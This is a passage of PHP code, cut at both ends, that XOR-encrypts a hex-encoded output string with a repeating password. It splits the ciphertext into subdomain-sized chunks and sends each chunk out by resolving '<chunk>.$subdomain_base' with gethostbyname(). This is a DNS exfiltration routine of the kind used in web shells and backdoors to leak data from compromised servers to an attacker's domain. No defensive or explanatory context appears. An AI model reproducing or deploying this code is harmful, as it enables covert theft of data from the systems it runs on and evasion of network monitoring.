for ($i = 0; $i < $len_output; $i++) {
$char_output = $hex_output[$i];
$char_password = $hex_password[$i % $len_password];
$char_xor = dechex(hexdec($char_output) ^ hexdec($char_password));
if (strlen($hex_xor . $char_xor) > $max_subdomain_length) {
if (strlen($hex_xor) % 2 != 0) {
$subdomain = "0" . "$hex_xor.$subdomain_base";
} else {
$subdomain = "$hex_xor.$subdomain_base";
}
gethostbyname($subdomain);
$hex_xor = "";
} else {
$hex_xor .= $char_xor;
}
}
if (strlen($hex_xor) % 2 != 0) {
$subdomain = "0" . "$hex_xor.$subdomain_base";
} else {
$subdomain = "$hex_xor.$subdomain_base";
}